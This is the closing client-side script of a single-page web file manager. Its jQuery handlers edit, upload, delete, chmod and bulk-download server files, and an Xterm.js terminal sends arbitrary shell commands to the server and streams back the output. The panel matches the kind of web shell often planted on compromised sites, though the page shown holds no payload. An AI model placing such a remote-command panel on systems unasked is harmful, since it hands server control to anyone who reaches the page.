                }).then((result) => {
                    if (result.isConfirmed) {
                        $.post(API_URL, {
                                action: 'delete',
                                name: itemNameToDelete
                            }, handleApiResponse, 'json')
                            .fail(() => showError('Failed to send request.'));
                    }
                })
            });

            let itemToChmod = '';
            tableBody.on('click', '.chmod-btn', function(e) {
                e.preventDefault();
                e.stopPropagation();
                itemToChmod = $(this).closest('.file-row').data('name');
                const currentPerms = $(this).data('current-perms');
                $('#chmodItemName').text(itemToChmod);
                $('#chmodValue').val(currentPerms);
                chmodModal.show();
            });

            let fileToEdit = '';

            function editFile(fileName) {
                showLoading('Loading File', `Opening <strong>${fileName}</strong>...`);

                fileToEdit = fileName;
                $('#editorModalLabel').text(`Edit File: ${fileToEdit}`);
                const extension = fileToEdit.split('.').pop().toLowerCase();
                let mode = 'text';
                const modeMap = {
                    js: 'javascript',
                    css: 'css',
                    html: 'html',
                    json: 'json',
                    md: 'markdown',
                    sh: 'sh'
                };
                if (modeMap[extension]) mode = modeMap[extension];
                editor.session.setMode(`ace/mode/${mode}`);

                $.get(API_URL, {
                    action: 'get-content',
                    name: fileToEdit
                }, function(response) {
                    if (response.success) {
                        Swal.close();
                        editor.setValue(response.content, -1);
                        editorModal.show();
                    } else {
                        showError(response.message);
                    }
                }).fail(function() {
                    showError('Error');
                });
            }

            tableBody.on('click', '.edit-btn', function(e) {
                e.preventDefault();
                e.stopPropagation();
                const fileName = $(this).closest('.file-row').data('name');
                editFile(fileName);
            });

            tableBody.on('click', '.download-btn', function(e) {
                e.preventDefault();
                e.stopPropagation();
                const fileName = $(this).closest('.file-row').data('name');
                window.location.href = `?action=download&name=${encodeURIComponent(fileName)}`;
            });

            $('#createFileBtn, #fabCreateFile').on('click', function() {
                $('#actionType').val('create-file');
                $('#itemForm')[0].reset();
                $('#formModalLabel').text('Create New File');
                $('#itemNameLabel').text('File Name');
                $('#itemName').attr('placeholder', 'e.g., newfile.txt');
                formModal.show();
                if ($('.fab-container').hasClass('active')) $('.fab-container').removeClass('active');
            });

            $('#createDirBtn, #fabCreateDir').on('click', function() {
                $('#actionType').val('create-dir');
                $('#itemForm')[0].reset();
                $('#formModalLabel').text('Create New Directory');
                $('#itemNameLabel').text('Directory Name');
                $('#itemName').attr('placeholder', 'e.g., new_folder');
                formModal.show();
                if ($('.fab-container').hasClass('active')) $('.fab-container').removeClass('active');
            });

            $('#saveBtn').on('click', function() {
                const action = $('#actionType').val();
                const name = $('#itemName').val();
                if (!name) return showError('Name cannot be empty!');

                let postData = {
                    action: action,
                    name: name
                };
                if (action === 'rename') {
                    postData.old_name = $('#originalName').val();
                    postData.new_name = name;
                }

                $.post(API_URL, postData, handleApiResponse, 'json').fail(() => showError('An error occurred.'));
                formModal.hide();
            });

            $('#saveChmodBtn').on('click', function() {
                const perms = $('#chmodValue').val();
                if (!perms) return showError('Permissions value cannot be empty!');

                $.post(API_URL, {
                        action: 'chmod',
                        name: itemToChmod,
                        perms: perms
                    }, handleApiResponse, 'json')
                    .fail(() => showError('An error occurred.'));
                chmodModal.hide();
            });

            $('#saveEditorBtn').on('click', function() {
                const content = editor.getValue();
                $.post(API_URL, {
                    action: 'save-content',
                    name: fileToEdit,
                    content: content
                }, function(response) {
                    if (response.success) {
                        showSuccess('File saved successfully.');
                        editorModal.hide();
                    } else {
                        showError(response.message);
                    }
                }, 'json').fail(() => showError('An error occurred.'));
            });

            const fabContainer = $('.fab-container');
            const fabButton = $('.fab-main-button');
            let fabIsDragging = false;
            fabButton.on('mousedown', function(e) {
                fabIsDragging = false;
                const fabInitialX = e.clientX,
                    fabInitialY = e.clientY;
                const pos = fabContainer.offset();
                const fabOffsetX = e.clientX - pos.left,
                    fabOffsetY = e.clientY - pos.top;

                function handleFabMouseMove(e) {
                    if (Math.abs(e.clientX - fabInitialX) > 5 || Math.abs(e.clientY - fabInitialY) > 5) {
                        fabIsDragging = true;
                        if (fabContainer.hasClass('active')) fabContainer.removeClass('active');
                    }
                    if (fabIsDragging) {
                        fabContainer.css({
                            right: 'auto',
                            bottom: 'auto',
                            left: (e.clientX - fabOffsetX) + 'px',
                            top: (e.clientY - fabOffsetY) + 'px'
                        });
                    }
                }

                function handleFabMouseUp() {
                    $(document).off('mousemove', handleFabMouseMove).off('mouseup', handleFabMouseUp);
                    setTimeout(() => {
                        fabIsDragging = false;
                    }, 0);
                }
                $(document).on('mousemove', handleFabMouseMove).on('mouseup', handleFabMouseUp);
            });
            fabButton.on('click', function(e) {
                if (fabIsDragging) return e.stopImmediatePropagation();
                fabContainer.toggleClass('active');
            });

            $('#fabUploadFile').on('click', function() {
                $('#fileUploadInput').click();
                fabContainer.removeClass('active');
            });

            $('#fileUploadInput').on('change', function() {
                if (this.files.length === 0) return;

                const formData = new FormData();
                formData.append('action', 'upload-file');
                for (let i = 0; i < this.files.length; i++) {
                    formData.append('files_to_upload[]', this.files[i]);
                }

                showLoading('Uploading Files...', `Uploading ${this.files.length} selected file(s).`);

                $.ajax({
                    url: API_URL,
                    type: 'POST',
                    data: formData,
                    processData: false,
                    contentType: false,
                    dataType: 'json',
                    success: handleApiResponse,
                    error: function() {
                        showError('Upload failed. Check console.');
                    },
                    complete: function() {
                        $('#fileUploadInput').val('');
                    }
                });
            });

            loadFiles();
            updateHeaderStats();

            // AKSI MASSAL
            const bulkBar = $('#bulkActions');
            const selectedCount = $('#selectedCount');
            const selectAll = $('#selectAll');

            function getSelectedFiles() {
                return $('.file-checkbox:checked').closest('.file-row').map(function() {
                    return $(this).data('name');
                }).get();
            }

            function updateBulkBar() {
                const checkedCount = $('.file-checkbox:checked').length;
                selectedCount.text(checkedCount);
                if (checkedCount > 0) bulkBar.removeClass('d-none');
                else bulkBar.addClass('d-none');
                const totalCheckboxes = $('.file-checkbox').length;
                selectAll.prop('checked', checkedCount > 0 && checkedCount === totalCheckboxes);
            }

            $(document).on('change', '.file-checkbox', updateBulkBar);
            selectAll.on('change', function() {
                $('.file-checkbox').prop('checked', this.checked);
                updateBulkBar();
            });

            $('#bulkDelete').on('click', function() {
                const files = getSelectedFiles();
                if (!files.length) return;

                Swal.fire({
                    title: 'Confirm Bulk Delete',
                    text: `Are you sure you want to delete ${files.length} selected items?`,
                    icon: 'warning',
                    showCancelButton: true,
                    confirmButtonColor: '#f78166',
                    cancelButtonColor: '#30363d',
                    confirmButtonText: 'Yes, Delete All',
                    cancelButtonText: 'Cancel'
                }).then((result) => {
                    if (result.isConfirmed) {
                        $.post(API_URL, {
                                action: 'bulk-delete',
                                items: JSON.stringify(files)
                            }, handleApiResponse, 'json')
                            .fail(() => showError('Failed to send bulk delete request.'));
                    }
                });
            });

            $('#bulkDownload').on('click', function() {
                const files = getSelectedFiles();
                if (!files.length) return;
                const url = `?action=bulk-download&items=${encodeURIComponent(JSON.stringify(files))}`;
                window.location.href = url;
            });

            $('#bulkChmod').on('click', function() {
                const files = getSelectedFiles();
                if (!files.length) return;
                $('#bulkChmodCount').text(files.length);
                $('#bulkChmodValue').val('');
                bulkChmodModal.show();
            });

            $('#saveBulkChmodBtn').on('click', function() {
                const files = getSelectedFiles();
                const perms = $('#bulkChmodValue').val();
                if (!perms.match(/^[0-7]{4}$/)) {
                    return showError('Invalid permission format. Use a 4-digit octal value (e.g., 0755).');
                }
                $.post(API_URL, {
                        action: 'bulk-chmod',
                        items: JSON.stringify(files),
                        perms: perms
                    }, handleApiResponse, 'json')
                    .fail(() => showError('An error occurred.'));
                bulkChmodModal.hide();
            });

            let contextTarget = null;
            $(document).on('contextmenu', '.file-row', function(e) {
                e.preventDefault();
                $('.row-context-active').removeClass('row-context-active');
                contextTarget = $(this).addClass('row-context-active');
                $('#contextMenu').css({
                    top: e.pageY + 'px',
                    left: e.pageX + 'px'
                }).show();
            });

            $(document).on('click', function() {
                $('#contextMenu').hide();
                $('.row-context-active').removeClass('row-context-active');
            });

            // Context actions
            $('.ctx-edit').on('click', function() {
                contextTarget && contextTarget.find('.edit-btn').click();
            });
            $('.ctx-rename').on('click', function() {
                contextTarget && contextTarget.find('.rename-btn').click();
            });
            $('.ctx-download').on('click', function() {
                contextTarget && contextTarget.find('.download-btn').click();
            });
            $('.ctx-delete').on('click', function() {
                contextTarget && contextTarget.find('.delete-btn').click();
            });
        });
    </script>
    <script>
        // --- [MODIFIED] Xterm.js Terminal Logic with Streaming ---
        const gruvboxDarkTheme = {
            background: '#161b22',
            foreground: '#c9d1d9',
            cursor: '#f78166',
            selectionBackground: '#504945',
            black: '#282828',
            brightBlack: '#928374',
            red: '#cc241d',
            brightRed: '#fb4934',
            green: '#98971a',
            brightGreen: '#b8bb26',
            yellow: '#d79921',
            brightYellow: '#fabd2f',
            blue: '#458588',
            brightBlue: '#83a598',
            magenta: '#b16286',
            brightMagenta: '#d3869b',
            cyan: '#689d6a',
            brightCyan: '#8ec07c',
            white: '#a89984',
            brightWhite: '#ebdbb2'
        };
        const term = new Terminal({
            cursorBlink: true,
            allowTransparency: true,
            theme: gruvboxDarkTheme
        });
        const fitAddon = new FitAddon.FitAddon();
        term.loadAddon(fitAddon);
        term.open(document.getElementById('terminal'));
        fitAddon.fit();

        let command = '';
        const prompt = '$ ';
        term.write(prompt);

        term.onData(data => {
            // Handle Enter key
            if (data === '\r') {
                const trimmedCommand = command.trim();
                term.writeln('');

                if (trimmedCommand === 'clear') {
                    term.clear();
                    term.write(prompt);
                } else if (trimmedCommand) {
                    // Use Fetch API to handle both normal and streaming responses
                    fetch('?action=terminal', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                cmd: trimmedCommand
                            })
                        })
                        .then(response => {
                            const contentType = response.headers.get("content-type");
                            if (contentType && contentType.includes("application/json")) {
                                return response.json().then(data => {
                                    if (data.output) {
                                        term.write(data.output.replace(/\n/g, '\r\n'));
                                    }
                                    term.write('\r\n' + prompt);
                                });
                            } else {
                                const reader = response.body.getReader();
                                const decoder = new TextDecoder();

                                function processStream() {
                                    return reader.read().then(({
                                        done,
                                        value
                                    }) => {
                                        if (done) {
                                            term.write('\r\n' + prompt);
                                            return;
                                        }
                                        const chunk = decoder.decode(value, {
                                            stream: true
                                        });
                                        term.write(chunk.replace(/\n/g, '\r\n'));
                                        return processStream();
                                    });
                                }
                                return processStream();
                            }
                        })
                        .catch(error => {
                            console.error('Terminal command failed:', error);
                            term.writeln('\r\n\x1b[31mError: ' + error.message + '\x1b[0m');
                            term.write('\r\n' + prompt);
                        });
                } else {
                    term.write(prompt);
                }
                command = '';
            }
            else if (data === '\x7f') {
                if (command.length > 0) {
                    term.write('\b \b'); 
                    command = command.slice(0, -1);
                }
            }
            else {
                command += data;
                term.write(data);
            }
        });

        term.onKey(({
            domEvent
        }) => {
            if (domEvent.ctrlKey && domEvent.key.toLowerCase() === 'l') {
                domEvent.preventDefault();
                term.clear();
                term.write(prompt + command);
            }
        });
    </script>
</body>

</html>
